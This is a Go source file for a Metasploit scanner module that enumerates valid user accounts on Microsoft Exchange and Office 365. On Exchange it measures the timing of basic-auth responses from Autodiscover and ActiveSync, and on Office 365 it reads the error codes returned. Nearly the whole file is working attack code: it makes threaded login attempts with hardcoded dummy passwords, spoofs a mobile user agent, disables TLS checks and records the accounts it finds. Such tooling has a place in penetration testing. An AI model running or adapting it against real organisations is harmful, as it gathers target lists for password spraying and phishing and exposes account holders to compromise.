//usr/bin/env go run "$0" "$@"; exit "$?"

/*
 OWA (Outlook Webapp) is vulnerable to time-based user enumeration attacks.
 This module leverages all known, and even some lesser-known services exposed by default
 Exchange installations to enumerate users. It also targets Office 365 for error-based user enumeration.

 Error-based user enumeration for Office 365 integrated email addresses
*/
package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"metasploit/module"
	"msmail"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	metadata := &module.Metadata{
		Name:        "msmail_enum",
		Description: "Office 365 and Exchange Enumeration",
		Authors:     []string{"poptart", "jlarose", "Vincent Yiu", "grimhacker", "Nate Power", "Nick Powers", "clee-r7"},
		Date:        "2018-11-06",
		Type:        "single_scanner",
		Privileged:  false,
		References:  []module.Reference{},
		Options: map[string]module.Option{
			"OnPrem":     {Type: "bool", Description: "Flag to specify an On-Premise instance of Exchange", Required: false, Default: "false"},
			"O365":       {Type: "bool", Description: "Use this flag if Exchange services are hosted by Office 365", Required: false, Default: "false"},
			"USERNAME":   {Type: "string", Description: "Single user name to do identity test against", Required: false, Default: ""},
			"USER_FILE":  {Type: "string", Description: "Path to file containing list of users", Required: false, Default: ""},
			"EMAIL":      {Type: "string", Description: "Single email address to do identity test against", Required: false, Default: ""},
			"EMAIL_FILE": {Type: "string", Description: "Path to file containing list of email addresses", Required: false, Default: ""},
		}}

	module.Init(metadata, run_enum)
}

func run_enum(params map[string]interface{}) {
	onPrem, e := strconv.ParseBool(params["OnPrem"].(string))
	if e != nil {
		module.LogError("Unable to parse 'OnPrem' value: " + e.Error())
		return
	}

	o365, e := strconv.ParseBool(params["O365"].(string))
	if e != nil {
		module.LogError("Unable to parse 'O365' value: " + e.Error())
		return
	}

	if !onPrem && !o365 {
		module.LogError("'OnPrem' and/or 'O365' needs to be set")
		return
	}

	threads, e := strconv.Atoi(params["THREADS"].(string))
	if e != nil {
		module.LogError("Unable to parse 'Threads' value using default (5)")
		threads = 5
	}

	if threads > 100 {
		module.LogInfo("Threads value too large, setting max(100)")
		threads = 100
	}

	if onPrem {
		runOnPrem(params, threads)
	}

	if o365 {
		runO365(params, threads)
	}
}

func runOnPrem(params map[string]interface{}, threads int) {
	// The core shim prevents an empty RHOSTS value - we should fix this.
	userFile := params["USER_FILE"].(string)
	userName := params["USERNAME"].(string)
	host := params["RHOSTS"].(string)

	if userFile == "" && userName == "" {
		module.LogError("Expected 'USER_FILE' or 'USERNAME' field to be populated")
		return
	}

	var validUsers []string
	avgResponse := basicAuthAvgTime(host)
	if userFile != "" {
		validUsers = determineValidUsers(host, avgResponse, importUserList(userFile), threads)
	} else {
		validUsers = determineValidUsers(host, avgResponse, []string{userName}, threads)
	}

	reportValidUsers(host, validUsers)
}

func runO365(params map[string]interface{}, threads int) {
	email := params["EMAIL"].(string)
	emailFile := params["EMAIL_FILE"].(string)
	host := params["RHOSTS"].(string)

	if email == "" && emailFile == "" {
		module.LogError("Expected 'EMAIL' or 'EMAIL_FILE' field to be populated")
		return
	}

	var validUsers []string
	if email != "" {
		validUsers = o365enum([]string{email}, threads)
	}

	if emailFile != "" {
		validUsers = o365enum(importUserList(emailFile), threads)
	}

	reportValidUsers(host, validUsers)
}

func importUserList(tempname string) []string {
	userFileBytes, err := ioutil.ReadFile(tempname)
	if err != nil {
		module.LogError(err.Error())
	}
	var userFileString = string(userFileBytes)
	userArray := strings.Split(userFileString, "\n")
	//Delete last unnecessary newline inserted into this slice
	userArray = userArray[:len(userArray)-1]
	return userArray
}

func determineValidUsers(host string, avgResponse time.Duration, userlist []string, threads int) []string {
	limit := threads
	var wg sync.WaitGroup
	mux := &sync.Mutex{}
	queue := make(chan string)

	/*Keep in mind you, nothing has been added to handle successful auths
	  so the password for auth attempts has been hardcoded to something
	  that is not likely to be correct.
	*/
	pass := "Summer2018978"
	internaldomain := msmail.HarvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if msmail.WebRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if msmail.WebRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if msmail.WebRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return []string{}
	}
	var validusers []string
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for user := range queue {
				startTime := time.Now()
				webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+user, pass, tr)
				elapsedTime := time.Since(startTime)

				if float64(elapsedTime) < float64(avgResponse)*0.77 {
					mux.Lock()
					module.LogInfo("[+] " + user + " - " + string(elapsedTime))
					validusers = append(validusers, user)
					mux.Unlock()
				} else {
					mux.Lock()
					module.LogInfo("[-] " + user + " - " + string(elapsedTime))
					mux.Unlock()
				}
			}
		}(i)
	}

	for i := 0; i < len(userlist); i++ {
		queue <- userlist[i]
	}

	close(queue)
	wg.Wait()
	return validusers
}

func basicAuthAvgTime(host string) time.Duration {
	internaldomain := msmail.HarvestInternalDomain(host, false)
	url1 := "https://" + host + "/autodiscover/autodiscover.xml"
	url2 := "https://" + host + "/Microsoft-Server-ActiveSync"
	url3 := "https://autodiscover." + host + "/autodiscover/autodiscover.xml"
	var urlToHarvest string
	if msmail.WebRequestCodeResponse(url1) == 401 {
		urlToHarvest = url1
	} else if msmail.WebRequestCodeResponse(url2) == 401 {
		urlToHarvest = url2
	} else if msmail.WebRequestCodeResponse(url3) == 401 {
		urlToHarvest = url3
	} else {
		module.LogInfo("Unable to resolve host provided to determine valid users.")
		return -1
	}

	//We are determining sample auth response time for invalid users, the password used is irrelevant.
	pass := "Summer201823904"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	module.LogInfo("Collecting sample auth times...")

	var sliceOfTimes []float64
	var medianTime float64

	usernamelist := []string{"sdfsdskljdfhkljhf", "ssdlfkjhgkjhdfsdfw", "sdfsdfdsfff", "sefsefsefsss", "lkjhlkjhiuyoiuy", "khiuoiuhohuio", "s2222dfs45g45gdf", "sdfseddf3333"}
	for i := 0; i < len(usernamelist)-1; i++ {
		startTime := time.Now()
		webRequestBasicAuth(urlToHarvest, internaldomain+"\\"+usernamelist[i], pass, tr)
		elapsedTime := time.Since(startTime)
		if elapsedTime > time.Second*15 {
			module.LogInfo("Response taking longer than 15 seconds, setting time:")
			module.LogInfo("Avg Response: " + time.Duration(elapsedTime).String())
			return time.Duration(elapsedTime)
		}
		if i != 0 {
			module.LogInfo(elapsedTime.String())
			sliceOfTimes = append(sliceOfTimes, float64(elapsedTime))
		}
	}
	sort.Float64s(sliceOfTimes)
	if len(sliceOfTimes)%2 == 0 {
		positionOne := len(sliceOfTimes)/2 - 1
		positionTwo := len(sliceOfTimes) / 2
		medianTime = (sliceOfTimes[positionTwo] + sliceOfTimes[positionOne]) / 2
	} else if len(sliceOfTimes)%2 != 0 {
		position := len(sliceOfTimes)/2 - 1
		medianTime = sliceOfTimes[position]
	} else {
		module.LogError("Error determining whether length of times gathered is even or odd to obtain median value.")
	}
	module.LogInfo("Avg Response: " + time.Duration(medianTime).String())
	return time.Duration(medianTime)
}

func o365enum(emaillist []string, threads int) []string {
	limit := threads
	var wg sync.WaitGroup
	mux := &sync.Mutex{}
	queue := make(chan string)
	//limit := 100

	/*Keep in mind you, nothing has been added to handle successful auths
	  so the password for auth attempts has been hardcoded to something
	  that is not likely to be correct.
	*/
	pass := "Summer2018876"
	URI := "https://outlook.office365.com/Microsoft-Server-ActiveSync"
	var validemails []string

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	for i := 0; i < limit; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for email := range queue {
				responseCode := webRequestBasicAuth(URI, email, pass, tr)
				if strings.Contains(email, "@") && responseCode == 401 {
					mux.Lock()
					module.LogInfo("[+]  " + email + " - 401")
					validemails = append(validemails, email)
					mux.Unlock()
				} else if strings.Contains(email, "@") && responseCode == 404 {
					mux.Lock()
					module.LogInfo(fmt.Sprintf("[-]  %s - %d \n", email, responseCode))
					mux.Unlock()
				} else {
					mux.Lock()
					module.LogInfo(fmt.Sprintf("Unusual Response: %s - %d \n", email, responseCode))
					mux.Unlock()
				}
			}
		}(i)
	}

	for i := 0; i < len(emaillist); i++ {
		queue <- emaillist[i]
	}

	close(queue)
	wg.Wait()
	return validemails
}

func webRequestBasicAuth(URI string, user string, pass string, tr *http.Transport) int {
	timeout := time.Duration(45 * time.Second)
	client := &http.Client{
		Timeout:   timeout,
		Transport: tr,
	}
	req, err := http.NewRequest("GET", URI, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1")
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err != nil {
		module.LogInfo(fmt.Sprintf("Potential Timeout - %s \n", user))
		module.LogInfo("One of your requests has taken longer than 45 seconds to respond.")
		module.LogInfo("Consider lowering amount of threads used for enumeration.")
		module.LogError(err.Error())
	}
	return resp.StatusCode
}

func reportValidUsers(ip string, validUsers []string) {
	port := "443"
	service := "owa"
	protocol := "tcp"
	for _, user := range validUsers {
		opts := map[string]string{
			"port":         port,
			"service_name": service,
			"address":      ip,
			"protocol":     protocol,
			"fullname":     "auxiliary/scanner/msmail/user_enum",
		}
		module.ReportCredentialLogin(user, "", opts)
	}
}
